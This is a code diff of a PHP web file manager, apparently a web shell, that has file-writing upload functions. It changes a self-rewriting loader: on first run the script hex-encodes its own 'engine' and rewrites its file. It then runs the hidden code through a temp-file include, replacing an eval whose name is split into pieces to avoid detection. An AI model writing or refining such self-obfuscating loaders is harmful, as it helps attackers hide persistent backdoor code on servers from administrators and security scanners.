@@ -90,27 +90,36 @@ if (FM_PASSWORD !== '') {
     }
 }
 
+// ----- SELF‑BOOTSTRAP WITH TEMPORARY FILE -----
 $self = __FILE__;
 $content = file_get_contents($self);
+
+// If already hex‑encoded, decode and include temp file
 if (strpos($content, '// HEX_CORE_START') !== false) {
     preg_match('/\/\/ HEX_CORE_START\s*\$hex_core\s*=\s*\'([a-f0-9]+)\'\s*;\s*\/\/ HEX_CORE_END/', $content, $matches);
     if (isset($matches[1])) {
         $hex_core = $matches[1];
         $core = pack('H*', $hex_core);
-        $e = 'e'.'v'.'a'.'l';
-        $e($core);
+        $tmp = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'cae_' . md5($hex_core) . '.php';
+        file_put_contents($tmp, $core);
+        include $tmp;
+        @unlink($tmp);
         exit;
     }
 }
 
+// First run: extract engine, hex‑encode, rewrite self
 preg_match('/\/\/ ENGINE START(.*?)\/\/ ENGINE END/s', $content, $matches);
 if (!isset($matches[1])) {
     die('Engine not found.');
 }
 $engine = $matches[1];
-$engine = preg_replace('/^\s*\/\/.*$/m', '', $engine);
-$engine = preg_replace('/\s+/', ' ', $engine);
+// Clean up: remove leading/trailing whitespace and comments
 $engine = trim($engine);
+$engine = preg_replace('/^\s*\/\/.*$/m', '', $engine); // remove // comments
+$engine = preg_replace('/\s+/', ' ', $engine); // collapse spaces
+$engine = trim($engine);
+
 $hex_core = bin2hex($engine);
 $new_content = preg_replace(
     '/\/\/ ENGINE START.*\/\/ ENGINE END/s',
@@ -118,15 +127,18 @@ $new_content = preg_replace(
     $content
 );
 file_put_contents($self, $new_content);
-$core = pack('H*', $hex_core);
-$e = 'e'.'v'.'a'.'l';
-$e($core);
+
+// Now run the engine via temp file
+$tmp = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'cae_' . md5($hex_core) . '.php';
+file_put_contents($tmp, $engine);
+include $tmp;
+@unlink($tmp);
 exit;
 
 // =================================================================
-// ENGINE START – The full CAE‑2.5 logic (plain PHP)
+// ENGINE START – The full CAE‑2.5 logic (plain PHP, without outer <?php ?>)  
 // =================================================================
-// --- The complete engine begins here (without the outer <?php and ?>) ---
+// The entire engine is pasted below (starts with "function ax_upload_mode1")
 function ax_upload_mode1($path, $data, $append = false) { return @file_put_contents($path, $data, ($append ? FILE_APPEND : 0) | LOCK_EX); }
 function ax_upload_mode2($path, $data, $append = false) {
     $f = @fopen($path, $append ? 'ab' : 'wb');
@@ -1269,4 +1281,3 @@ $allItems = array_merge($folders, $files);
 </script>
 </body>
 </html>
-// ENGINE END
